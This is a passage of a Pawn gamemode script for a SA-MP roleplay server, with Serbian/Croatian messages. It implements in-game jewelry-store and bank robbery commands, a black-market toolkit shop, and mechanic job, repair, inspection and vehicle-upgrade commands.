    if( GetFactionType( playerid ) == ORG_TIP_VLADINA || GetFactionType( playerid ) == ORG_TIP_HITMAN ) return SendErrorMessage( playerid, "Vrsta vase orge nema razloga pljackati zlataru!");
	if( gettime() < ZlataraOpljackana ) return SendErrorMessage( playerid, "Zlatara je vec opljackana, probajte za %d minuta.", (ZlataraOpljackana - gettime()) / 60 );
	if( gettime() < NestoPljackano ) return SendErrorMessage( playerid, "Jos %d minuta treba proci od poslednje pljacke(banke i zlatare) da bi opet pljackali.", NestoPljackano - gettime());
	if( PljackaZlato[ playerid ] > 0 ) return SendErrorMessage( playerid, "Moras bezati 5 minuta od policije da bi dobio zlato." );
    if( PljackaUToku ) return SendErrorMessage( playerid, "Ne mozete ovo dok je pljacka banke u toku." );
	if( gettime() < GlobalnoPetnaestMinuta ) return SendErrorMessage( playerid, "Mora proci jos %d sekundi od proslog roba.", GlobalnoPetnaestMinuta - gettime() );
	if( PlayerInfo[playerid][xToolkit] == 0 ) return SendErrorMessage(playerid, "Nemate toolkit/alat, kupite ga na crnom trzistu.");

	new policajci = 0, igraci = 0, hour, minute, seconds;
	gettimeEx( hour, minute, seconds );
	FixHour( hour );
	hour = shifthour;

	foreach( new i : Player)
	{
	    if( GetFactionType( i ) == ORG_TIP_VLADINA && PoliceDuty[ i ] ) policajci++;

 	    if( PlayerInfo[ i ][ xClan ] == PlayerInfo[ playerid ][ xClan ] )
		{
			igraci++;
		}
	}
	if( ( hour >= 23 ) && ( hour <= 09 ) ) return SendErrorMessage( playerid, "Ne moze koristit ovu komandu od 02 do 19h.");
	//if( policajci < 2 ) return SendErrorMessage( playerid, "Ne mozete pljackati zlataru ako nema 2 policajaca online na duty." );
	if( igraci < 3 )  return SendErrorMessage( playerid, "Moras imati bar 3 ljudi iz organizacije online." );

	if( GetWeapon( playerid ) >= 22 && GetWeapon( playerid ) <= 40 )
	{
        if( ( hour >= 09 ) && ( hour <= 23 ) )
        {
        	PlayerInfo[playerid][xToolkit] = 0;
        	sql_user_update_integer(playerid, "toolkit", PlayerInfo[playerid][xToolkit]);
			ZlatoVreme[ playerid ] = 600;
		    PljackaZlato[ playerid ] = 0;
		    ZlataraOpljackana = gettime()+(60*60);
		    ZlataraUToku = true;
		    NestoPljackano = gettime()+(15*60);
			PljackanjeZlatareTimer[ playerid ] = SetPlayerTimerEx(playerid, "PljackanjeZlatarice", 1000, true, "i", playerid);

			SendClientMessage( playerid, 0xFF4500FF, "(PLJACKA ZLATARE): Zapoceli ste pljacku zlatare." );
			SendClientMessage( playerid, 0xFF4500FF, "(PLJACKA ZLATARE): Pljacka zlatare traje {FFFFFF}(600) {FF4500}sekundi." );
			SendClientMessage( playerid, 0xFF4500FF, "(PLJACKA ZLATARE): Svake sekunde koju pljackate dobijate {FFFFFF}(1g) {FF4500}zlata." );

			PostaviWanted( playerid, "Pljacka Zlatare", "Nepoznati", 10 );
			GlobalnoPetnaestMinuta = gettime()+(15*60);

			ZlataraActorsHandsup();
			SetTimer_("ResetZlataraActors", 15*60, 15*60, 1);

			OOCNews( 0xFFA500FF, "_____________________________ {FFFFFF}(OBAVESTENJE) {FFA500}_____________________________" );
            OOCNews( -1, " ");
			OOCNews( 0xFFA500FF, "(PLJACKA ZLATARE): Neko pokusava da opljacka zlataru." );
			OOCNews( 0xFFA500FF, "(PLJACKA ZLATARE): Molimo sve jedinice da intervenisu." );
 
			AdminMsg( 0xFFA500AA, "([A]PLJACKA ZLATARE): {FFFFFF}%s[/spec %d] {FFA500}je poceo da pljacka zlataru.", ImeIgraca( playerid ), playerid );

            OOCNews( -1, " ");
            OOCNews( 0xFFA500FF, "___________________________ {FFFFFF}("SERVER_WEB") {FFA500}___________________________" );
		}
		else return SendErrorMessage( playerid, "Mozete pljackati samo od 9h do 23h." );
	}
	else return SendErrorMessage( playerid, "Nemate oruzje za pljackanje zlatare!" );
	return 1;
}

CMD:pljackajbanku( playerid )
{
	if( !IsPlayerInDynamicArea( playerid, bankSafe ) ) return SendErrorMessage( playerid, "Morate biti kod sefa banke." );
	//if( ServerInfo[BankaNovac] == 0 ) return SendErrorMessage( playerid, "Banka nema polozenog novca." );

    if( GetFactionType( playerid ) == ORG_TIP_VLADINA || GetFactionType( playerid ) == ORG_TIP_HITMAN ) return SendErrorMessage( playerid, "Vrsta vase orge nema razloga pljackati banku.");
	if( gettime() < BankaOpljackana ) return SendErrorMessage( playerid, "Banka je vec opljackana, probajte za %d minuta.", (BankaOpljackana - gettime()) / 60 );
	if( gettime() < NestoPljackano ) return SendErrorMessage( playerid, "Jos %d minuta treba proci od poslednje pljacke(banke i zlatare) da bi opet pljackali.", NestoPljackano - gettime());
    if( ZlataraUToku ) return SendErrorMessage( playerid, "Ne mozete ovo dok je pljacka zlatare u toku." );
	if( PljackaNovac[ playerid ] > 0 ) return SendErrorMessage( playerid, "Moras bezati 5 minuta od policije da bi dobio novac." );
	if( gettime() < GlobalnoPetnaestMinuta ) return SendErrorMessage( playerid, "Mora proci jos %d sekundi od proslog roba.", GlobalnoPetnaestMinuta - gettime() );
	if( PlayerInfo[playerid][xToolkit] == 0 ) return SendErrorMessage(playerid, "Nemate toolkit/alat, kupite ga na crnom trzistu.");

	new policajci = 0, igraci = 0, hour, minute, seconds;
	gettimeEx( hour, minute, seconds );
	FixHour( hour );
	hour = shifthour;

	foreach( new i : Player)
	{
	    if( GetFactionType( i ) == ORG_TIP_VLADINA && PoliceDuty[ i ] ) policajci++;

 	    if( PlayerInfo[ i ][ xClan ] == PlayerInfo[ playerid ][ xClan ] )
		{
			igraci++;
		}
	}
	//if( policajci < 2 ) return SendErrorMessage( playerid, "Ne mozete pljackati banku ako nema 2 policajaca online na duty." );
	if( igraci < 3 )  return SendErrorMessage( playerid, "Moras imati bar 3 ljudi iz organizacije online." );

	if( GetWeapon( playerid ) >= 22 && GetWeapon( playerid ) <= 40 )
	{
        if( ( hour >= 09 ) && ( hour <= 23 ) )
		{
			PlayerInfo[playerid][xToolkit] = 0;
        	sql_user_update_integer(playerid, "toolkit", PlayerInfo[playerid][xToolkit]);
			PljackaVreme[ playerid ] = 600;
		    PljackaNovac[ playerid ] = 0;
		    BankaOpljackana = gettime()+(60*60);
		    PljackaUToku = true;
		    NestoPljackano = gettime()+(15*60);
			PljackanjeBankeTimer[ playerid ] = SetPlayerTimerEx(playerid, "PljackanjeBankice", 1000, true, "i", playerid);

			SendClientMessage( playerid, 0xFF4500FF, "(PLJACKA BANKE): Zapoceli ste pljacku banke." );
			SendClientMessage( playerid, 0xFF4500FF, "(PLJACKA BANKE): Pljacka banke traje {FFFFFF}(600) {FF4500}sekundi." );
			SendClientMessage( playerid, 0xFF4500FF, "(PLJACKA BANKE): Svake sekunde koju pljackate dobijate {FFFFFF}(220-250) {FF4500}dolara." );

			PostaviWanted( playerid, "Pljacka Banke", "Nepoznati", 10 );
			GlobalnoPetnaestMinuta = gettime()+(15*60);

            OOCNews( 0xFFA500FF, "_____________________________ {FFFFFF}(OBAVESTENJE) {FFA500}_____________________________" );
            OOCNews( -1, " ");
			OOCNews( 0xFFA500FF, "(PLJACKA BANKE): Neko pokusava da opljacka banku." );
			OOCNews( 0xFFA500FF, "(PLJACKA BANKE): Molimo sve jedinice da intervenisu." );
 
			AdminMsg( 0xFFA500FF, "([A]PLJACKA BANKE): {FFFFFF}%s[/spec %d] {FFA500}je poceo da pljacka banku.", ImeIgraca( playerid ), playerid );

            OOCNews( -1, " ");
			OOCNews( 0xFFA500FF, "___________________________ {FFFFFF}("SERVER_WEB") {FFA500}___________________________" );
		}
		else return SendErrorMessage( playerid, "Mozete pljackati samo od 9h do 23h." );
	}
	else return SendErrorMessage( playerid, "Nemate oruzje za pljackanje banke!" );
	return 1;
}

CMD:crnotrziste( playerid )
{
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 197.0044, -232.2355, 1.7787 ) ) return SendErrorMessage( playerid, "Morate biti na lokaciji crnog trzista.");

	ShowPlayerDialog( playerid, dialog_BLACKMARKET, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																							"{FFFFFF}Naziv\t{FFFFFF}Cena\t{FFFFFF}Kolicina\n\
																							{4282C0}(1). {FFFFFF}Alat za obijanje\t500$\t1", "Odaberi", "Izlaz" );
	return 1;
}

_:public TehnickiPregled( playerid )
{
	new vehicleid = GetPlayerVehicleID( playerid ), Float:Health,
		engine, lights, alarm, doors, bonnet, boot, objective;

	if( vehicleid != IVI )
	{
		GetVehicleHealth( vehicleid, Health );

		if( Health > 980 )
		{
			VehicleInfo[ vehicleid ][ vTeh ] = 1;

			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_teh` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ vehicleid ][ vTeh ],
														VehicleInfo[ vehicleid ][ vSqlID ] );

			mysql_tquery( mSQL, q );

			SMG_TogglePlayerControllable( playerid, true );
			GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, 0, 0, boot, objective);

   			SendClientMessage( playerid, 0xFF0000FF, "(MEHANICAR): Prosli ste tehnicki pregled, sada mozete da registrujete vozilo.");
			return 1;
		}
		else
		{
			SMG_TogglePlayerControllable( playerid, true );
			GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, 0, 0, boot, objective);

			SendClientMessage( playerid, 0xFF0000FF, "(MEHANICAR): Ne mozete preci tehnicki sa pokvarenim vozilom.");
		    return 1;
		}
	}
	return 1;
}

CMD:ugradineon( playerid )
{
	if( IsPlayerInRangeOfPoint( playerid, 2.5, 1817.1223,-1404.1307,15.8400 ) )
	{
		if( IsVehicleBrod( GetPlayerVehicleID( playerid ) ) ||
			IsVehicleMotor( GetPlayerVehicleID( playerid ) ) ||
			IsVehicleBajs( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage(playerid, "Ne moze na ovom vozilu!");

		ShowPlayerDialog( playerid, dialog_NEONSHOP, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																			"{FFFFFF}Boja\t{FFFFFF}Cena\n\
																			{4282C0}(1). {FFFFFF}Plava\t2000$\n\
																			{4282C0}(2). {FFFFFF}Crvena\t2000$\n\
																			{4282C0}(3). {FFFFFF}Zelena\t2000$\n\
																			{4282C0}(4). {FFFFFF}Bela\t2000$\n\
																			{4282C0}(5). {FFFFFF}Pinky\t2000$\n\
																			{4282C0}(6). {FFFFFF}Zuta\t2000$\n\
																			{FF0000}(7). {FFFFFF}Obrisi\t300$", "Napred", "Izadji");
	}
	else return SendErrorMessage(playerid, "Morate biti kod mehanicara, potrazite lokaciju na [ /gps ]." );
   	return 1;
}

CMD:mechanic(playerid, const params[])
{
	if( PlayerInfo[ playerid ][ xPosao ] != POSAO_MEHANICAR ) return SendErrorMessage( playerid, "Niste mehanicar." );
	
	new item[10];
    if(sscanf(params, "s[10]", item))
	{
		SendUsageMessage(playerid, "/mechanic [opcija]");
     	SendClientMessage(playerid, -1, "OPCIJE: duty | job");
		return(true);
	}
	
	new engine,lights,alarm,doors,bonnet,boot,objective;
	if(strcmp(item, "duty", true) == 0)
	{
		if(!IsPlayerInRangeOfPoint(playerid, 20.0, 1833.9697,-1427.4281,13.6016)) return SendErrorMessage(playerid, "Niste blizu radionice.");

	    if( !JobDuty[playerid] )
		{
	        JobDuty[playerid] = true;
			SMG_SetPlayerSkin(playerid, 50);

	        SendJobMessage( playerid, "Sada ste na duznosti mehanicara." );
		}
		else 
		{
		    SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
			JobDuty[playerid] = false;

			SendJobMessage( playerid, "Vise niste na duznosti.");
		}
	    return(true);
	}
	else if(strcmp(item, "job", true) == 0)
	{
		if( JobDuty[playerid] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
		if( !IsPlayerInRangeOfPoint(playerid, 2.0, 1833.9697,-1427.4281,13.6016)) return SendErrorMessage(playerid, "Niste na mjestu za pokretanje posla.");
	    if( AccountVerified[ playerid ] == false ) return SendErrorMessage(playerid, "Prvo morate verifikovati svoj nalog komandom {FFFFFF}[ /vf ].");
		if( PosaoMehanicarCP[ playerid ] ) return SendErrorMessage(playerid, "Vec imas aktiviran posao, kucaj {FFFFFF}[ /stopwork ] {FF0000}ako zelis prekinuti.");

		new randommeh = random(10)+1;
	  	SMG_SetPlayerCheckpoint( playerid, MehanicarRandom[randommeh][0], MehanicarRandom[randommeh][1], MehanicarRandom[randommeh][2], 5.0 );
		CheckpointStatus[ playerid ] = 6;
		PosaoMehanicarCP[ playerid ] = true;
		OkacioTrailer[playerid] = false;
			
		SendJobMessage( playerid, "Krenuli ste sa prevozom vozila, mjesto na mapi vam je oznaceno crvenim markerom." );

		StaroVreme[ playerid ] = gettime();
	    NovoVreme[ playerid ] = 45;
	    AccountVerified[ playerid ] = false;

		if( PosaoVozilo[ playerid ] != -1 )
		{
			VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
		    DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
		    ResetVehicle( PosaoVozilo[ playerid ] );
			SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
			PosaoVozilo[ playerid ] = -1;
		}
		if( PosaoTrailer[ playerid ] != -1 )
		{
			VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
		    DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
		    ResetVehicle( PosaoTrailer[ playerid ] );
			SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
			PosaoTrailer[ playerid ] = -1;
		}

		PosaoVozilo[ playerid ] = SMG_CreateVehicle(525, 1833.9697,-1427.4281,13.6016,266.6837, 1, 0, -1 );
		LinkVehicleToInterior( PosaoVozilo[ playerid ], GetPlayerInterior( playerid ) );
	    SetVehicleVirtualWorld( PosaoVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
	    ResetVehicle( PosaoVozilo[ playerid ] );
		vCanDrive[ PosaoVozilo[ playerid ] ] = 1;
		PutPlayerInVehicle( playerid, PosaoVozilo[ playerid ], 0 );
		ResetVehicleStatistics( PosaoVozilo[ playerid ] );
		VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = true;
		new string[ 30+MAX_PLAYER_NAME+1 ];
	  	format( string, sizeof( string ), "(%s)\n{FFFFFF}%s", jobsInfos[PlayerInfo[playerid][xPosao]-1][jLabel], ImeIgraca(playerid) );
		VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x36AB00FF, 0.0, 0.0, -100.0, 15.0, IPI, PosaoVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

		new rtrailer = random(10);
		switch(rtrailer)
		{
			case 0: rtrailer = 400;
			case 1: rtrailer = 411;
			case 2: rtrailer = 415;
			case 3: rtrailer = 426;
			case 4: rtrailer = 451;
			case 5: rtrailer = 506;
			case 6: rtrailer = 541;
			case 7: rtrailer = 559;
			case 8: rtrailer = 560;
			case 9: rtrailer = 562;
			default: rtrailer = 560;
		}

		PosaoTrailer[ playerid ] = SMG_CreateVehicle(rtrailer, MehanicarRandom[randommeh][0], MehanicarRandom[randommeh][1], MehanicarRandom[randommeh][2], MehanicarRandom[randommeh][3], -1, -1, -1 );
		LinkVehicleToInterior( PosaoTrailer[ playerid ], GetPlayerInterior( playerid ) );
	    SetVehicleVirtualWorld( PosaoTrailer[ playerid ], GetPlayerVirtualWorld( playerid ) );
	    ResetVehicle( PosaoTrailer[ playerid ] );
		vCanDrive[ PosaoTrailer[ playerid ] ] = 0;
		ResetVehicleStatistics( PosaoTrailer[ playerid ] );
		VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = true;
	  	format( string, sizeof( string ), "(%s)\n{FFFFFF}%s", jobsInfos[PlayerInfo[playerid][xPosao]-1][jLabel], ImeIgraca(playerid) );
		VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x36AB00FF, 0.0, 0.0, -100.0, 15.0, IPI, PosaoTrailer[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);
		SetVehicleHealth( PosaoTrailer[ playerid ], 350.0 );
		UpdateVehicleDamageStatus(PosaoTrailer[ playerid ], 1, 2, 1, 3);

		GetVehicleParamsEx( PosaoVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
		SetVehicleParamsEx( PosaoVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );
	}
	return(true);
}

CMD:mehanicar( playerid, const params[] )
{
	new item[10],
		engine,lights,alarm,doors,bonnet,boot,objective;

	if( sscanf( params, "s[10]", item))
	{
		SendUsageMessage( playerid, "/mehanicar [opcija]");
     	SendClientMessage( playerid, -1, "OPCIJE: popravi | tehnicki | tuning");
        SendClientMessage( playerid, -1, "OPCIJE: alarm | immob | brava");
		return 1;
	}

	if( strcmp( item, "popravi", true) == 0)
	{
 		if( GetPlayerState( playerid ) != 2 ) return SendErrorMessage( playerid, "Morate biti u vozilu!");
		if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Morate biti 3+ da bi mu popravio vozilo." );
		if( !IsPlayerInRangeOfPoint( playerid, 30.0, 1817.6010,-1419.5872,15.8312 ) ) return SendErrorMessage( playerid, "Vozilo mozete popravljati samo u mehanicarskoj garazi!");
		if( PlayerInfo[ playerid ][ xNovac ] < 3000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );

		new Float:health;
		GetVehicleHealth( GetPlayerVehicleID( playerid ), health );
		if( health > 990 ) return SendErrorMessage( playerid, "Auto nije ostecen!");

		if( IsPlayerInAnyVehicle( playerid ) )
		{
			GetVehicleParamsEx( GetPlayerVehicleID( playerid ), engine, lights, alarm, doors, bonnet, boot, objective );
			if( bonnet == 0 && !IsVehicleBajs( GetPlayerVehicleID( playerid ) ) && !IsVehicleMotor( GetPlayerVehicleID( playerid ) ) && !IsVehicleLetelica( GetPlayerVehicleID( playerid ) ) && !IsVehicleBrod( GetPlayerVehicleID( playerid ) ) )
  			{
				SendErrorMessage( playerid, "Otvorite haubu prvo." );
				return 1;
			}
		}
		else SendErrorMessage(playerid, "Niste u vozilu.");

		SMG_RepairVehicle( playerid, GetPlayerVehicleID( playerid ) );

		if( vCanDrive[ GetPlayerVehicleID( playerid ) ] == 0 )
		{
			vCanDrive[ GetPlayerVehicleID( playerid ) ] = 1;
			SMG_TogglePlayerControllable( playerid, true );
		}

		DajIgracuNovac( playerid, -3000 );
		BussinesJobMoney( POSAO_MEHANICAR, 1500 );
		SendClientMessage(playerid, 0x33CCFFFF, "(MEHANICAR): Vase vozilo je popravljeno za $3000.");
		return 1;
	}
 	else if( strcmp( item, "tehnicki",true) == 0)
 	{
		if( GetPlayerState( playerid ) != 2 ) return SendErrorMessage( playerid, "Morate biti u vozilu!");

		new vehicleid = GetPlayerVehicleID( playerid ), Float:health;
		GetVehicleHealth( vehicleid, health );
		if( health < 950 ) return SendErrorMessage( playerid, "Auto je suvise ostecen!");

	    if( strcmp( ImeIgraca( playerid ), VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vOwner ], true ) == 0 ) { }
		else return SendErrorMessage( playerid, "Ovo vozilo nije u vasem vlasnistvu." );

		if( !IsPlayerInRangeOfPoint( playerid, 5.0, 1817.6010,-1419.5872,15.8312 ) ) return SendErrorMessage( playerid, "Morate biti u garazi za kod mehanicara." );
		if( VehicleInfo[ vehicleid ][ vTeh ] != 0 ) return SendErrorMessage( playerid, "Vozilo je vec proslo tehnicki pregled." );
		if( VehicleInfo[ vehicleid ][ vReg ] != 0 ) return SendErrorMessage( playerid, "Vozilo je vec registrovano." );

		SetPlayerTimerEx(playerid, "TehnickiPregled", 14000, false, "i", playerid);

		SetCameraBehindPlayer( playerid );
		SMG_TogglePlayerControllable( playerid, false );
	  	GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	    SetVehicleParamsEx( vehicleid, engine, lights, alarm, 1, 1, boot, objective);

		DajIgracuNovac( playerid, -2000 );
		BussinesJobMoney( POSAO_MEHANICAR, 1000);
		SendClientMessage( playerid, CRVENA, "(MEHANICAR): Tehnicki pregled u toku molimo sacekajte.");
 	    return 1;
 	}
 	else if(strcmp(item, "tuning", true) == 0)
	{
      	if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240)) return SendErrorMessage(playerid, "Niste na mestu za tuning.");
		if( GetPlayerState( playerid ) != 2 ) return SendErrorMessage( playerid, "Morate biti u vozilu!");
        new vehicleid = GetPlayerVehicleID( playerid );

		if( VehicleInfo[ vehicleid ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Mozete ugradjivati tuning samo na privatnim vozilima." );

		if( IsPlayerInAnyVehicle( playerid ) )
		{
		    if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
			{
			    PlayerTuningCar[ playerid ] = true;
  				TuningTDControl( playerid, true );
 				ShowPlayerDialog(playerid, dialog_TUNING, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Paintjobs\n{4282C0}(2). {FFFFFF}Colors\n{4282C0}(3). {FFFFFF}Exhausts\n{4282C0}(4). {FFFFFF}Front Bumper\n{4282C0}(5). {FFFFFF}Rear Bumper\n{4282C0}(6). {FFFFFF}Roof\n{4282C0}(7). {FFFFFF}Spoilers\n{4282C0}(8). {FFFFFF}Side Skirts\n{4282C0}(9). {FFFFFF}Wheels\n{4282C0}(10). {FFFFFF}Car Stereo\n{4282C0}(11). {FFFFFF}Hydraulics\n{4282C0}(12). {FFFFFF}Nitro", "Potvrdi", "Odustani");
			}
			else return SendErrorMessage( playerid, "Niste vlasnik tog vozila." );
		}
		else return SendErrorMessage(playerid, "Niste u vozilu.");
 	    return 1;
 	}
	else if( strcmp( item, "alarm",true) == 0)
	{
		if( GetPlayerState( playerid ) != 2 ) return SendErrorMessage( playerid, "Morate biti u vozilu!");

	    new vehicleid = GetPlayerVehicleID( playerid );

		if( VehicleInfo[ vehicleid ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Mozete ugradjivati alarm samo na privatnim vozilima." );
		if( VehicleInfo[ vehicleid ][ vAlarm ] + 1 == 5) return SendClientMessage( playerid, CRVENA, "[ VOZILO ]: {FFFFFF}To vozilo vec ima najveci level alarma." );
		if( !IsPlayerInRangeOfPoint( playerid, 8.0, 1817.6010,-1419.5872,15.8312 ) ) return SendErrorMessage( playerid, "Vozilo mozete unapredjivati samo u mehanicarskoj garazi!");
		if( PlayerInfo[ playerid ][ xNovac ] < (VehicleInfo[ vehicleid ][ vAlarm ]+1)*5000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca($%d).", (VehicleInfo[ vehicleid ][ vAlarm ]+1)*5000 );

  		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
		{
			if( IsPlayerInAnyVehicle( playerid ) )
			{
				SCMF( playerid, 0x33CCFFFF, "(MEHANICAR): Vas alarm je unapredjen na visi level za {FFFFFF}($%d).", (VehicleInfo[ vehicleid ][ vAlarm ]+1)*5000 );

				DajIgracuNovac( playerid, -(VehicleInfo[ vehicleid ][ vAlarm ]+1)*5000 );
				BussinesJobMoney( POSAO_MEHANICAR, (VehicleInfo[ vehicleid ][ vAlarm ]+1)*(5000/2) );

   				VehicleInfo[ vehicleid ][ vAlarm ]++;

				new q[ 128 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_alarm` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
												VehicleInfo[ vehicleid ][ vAlarm ],
												VehicleInfo[ vehicleid ][ vSqlID ] );
				mysql_tquery( mSQL, q );
			}
			else return SendErrorMessage(playerid, "Niste u vozilu.");
		}
		else return SendErrorMessage( playerid, "Niste vlasnik tog vozila." );
	    return 1;
	}
	else if( strcmp( item, "immob",true) == 0)
	{
		if( GetPlayerState( playerid ) != 2 ) return SendErrorMessage( playerid, "Morate biti u vozilu!");
	    new vehicleid = GetPlayerVehicleID( playerid );

		if( VehicleInfo[ vehicleid ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Mozete ugradjivati imobilizator samo na privatnim vozilima." );
		if(VehicleInfo[ vehicleid ][ vImobilizator ] + 1 == 6) return SendClientMessage( playerid, CRVENA, "[ VOZILO ]: {FFFFFF}To vozilo vec ima najveci level imobilizatora." );

		if( !IsPlayerInRangeOfPoint( playerid, 8.0, 1817.6010,-1419.5872,15.8312 ) ) return SendErrorMessage( playerid, "Vozilo mozete unapredjivati samo u mehanicarskoj garazi!");
		if( PlayerInfo[ playerid ][ xNovac ] < (VehicleInfo[ vehicleid ][ vImobilizator ]+1)*7000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca($%d).", (VehicleInfo[ vehicleid ][ vImobilizator ]+1)*7000 );
  		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
		{
			if( IsPlayerInAnyVehicle( playerid ) )
			{
				SCMF( playerid, 0x33CCFFFF, "(MEHANICAR): Vas imobilizator je unapredjen na visi level za {FFFFFF}($%d).", (VehicleInfo[ vehicleid ][ vImobilizator ]+1)*7000 );

				DajIgracuNovac( playerid, -(VehicleInfo[ vehicleid ][ vImobilizator ]+1)*7000 );
				BussinesJobMoney( POSAO_MEHANICAR, (VehicleInfo[ vehicleid ][ vImobilizator ]+1)*(7000/2) );

   				VehicleInfo[ vehicleid ][ vImobilizator ]++;

				new q[ 128 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_imobilizator` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
												VehicleInfo[ vehicleid ][ vImobilizator ],
												VehicleInfo[ vehicleid ][ vSqlID ] );
				mysql_tquery( mSQL, q );
			}
			return 1;
		}
		else return SendErrorMessage( playerid, "Niste vlasnik tog vozila." );
	}
	else if( strcmp( item, "brava",true) == 0)
	{
		if( GetPlayerState( playerid ) != 2 ) return SendErrorMessage( playerid, "Morate biti u vozilu!");
	    new vehicleid = GetPlayerVehicleID( playerid );

		if( VehicleInfo[ vehicleid ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Mozete ugradjivati bravu samo na privatnim vozilima." );
		if(VehicleInfo[ vehicleid ][ vLock ] + 1 == 6) return SendClientMessage( playerid, CRVENA, "[ VOZILO ]: {FFFFFF}To vozilo vec ima najveci level brave." );

		if( !IsPlayerInRangeOfPoint( playerid, 8.0, 1817.6010,-1419.5872,15.8312 ) ) return SendErrorMessage( playerid, "Vozilo mozete unapredjivati samo u mehanicarskoj garazi!");
		if( PlayerInfo[ playerid ][ xNovac ] < (VehicleInfo[ vehicleid ][ vLock ]+1)*6000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca($%d).", (VehicleInfo[ vehicleid ][ vLock ]+1)*6000 );
  		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
		{
			if( IsPlayerInAnyVehicle( playerid ) )
			{
				SCMF( playerid, 0x33CCFFFF, "(MEHANICAR): Vasa brava je unapredjena na visi level za {FFFFFF}($%d).", (VehicleInfo[ vehicleid ][ vLock ]+1)*6000 );

				DajIgracuNovac( playerid, -(VehicleInfo[ vehicleid ][ vLock ]+1)*6000 );
				BussinesJobMoney( POSAO_MEHANICAR, (VehicleInfo[ vehicleid ][ vLock ]+1)*(6000/2) );

				VehicleInfo[ vehicleid ][ vLock ]++;

				new q[ 128 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_lock` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
												VehicleInfo[ vehicleid ][ vLock ],
												VehicleInfo[ vehicleid ][ vSqlID ] );
   				mysql_tquery( mSQL, q );
			}
			return 1;
		}
		else return SendErrorMessage( playerid, "Niste vlasnik tog vozila." );
	}
	else
	{
		SendUsageMessage(playerid, "/mehanicar [opcija]");
     	SendClientMessage(playerid, -1, "OPCIJE: popravi | tehnicki | tuning");
        SendClientMessage(playerid, -1, "OPCIJE: alarm | immob | brava");
	}
	return 1;
}

CMD:cancel( playerid, const params[] )
{
	new x_job[10];
	sscanf(params, "s[10]", x_job);
	if(!strlen(x_job))
	{
		SendUsageMessage( playerid, "/cancel [opcija]");
     	SendClientMessage( playerid, -1, "OPCIJE: ticket | drugs | mats | gold");
		return 1;
	}
    else if(strcmp(x_job, "ticket", true) == 0) TicketOffer[playerid] = -1, TicketMoney[playerid] = 0;
    else if(strcmp(x_job, "drugs", true) == 0)
    {
		if( GiveItemID[ playerid ] != IPI )
		{
		    new userid = GiveItemID[ playerid ];
			SendInfoMessage( userid, "{FFFFFF}%s {4282C0}je odbio vasu ponudu za prodaju droge.", ImeIgraca( playerid ) );
			SendInfoMessage( playerid, "Odbili ste ponudu za kupovinu droge od {FFFFFF}%s.", ImeIgraca( userid ) );

			ChosenItem[ playerid ] = -1;
			ItemPrice[ playerid ] = 0;
			ItemQuantity[ playerid ] = 0;
			GiveItemID[ playerid ] = -1;
		}
		else
		{
			SendInfoMessage( playerid, "Odbili ste ponudu za kupovinu droge." );
	
			ChosenItem[ playerid ] = -1;
		    ItemPrice[ playerid ] = 0;
		    ItemQuantity[ playerid ] = 0;
		    GiveItemID[ playerid ] = -1;
		}
    }
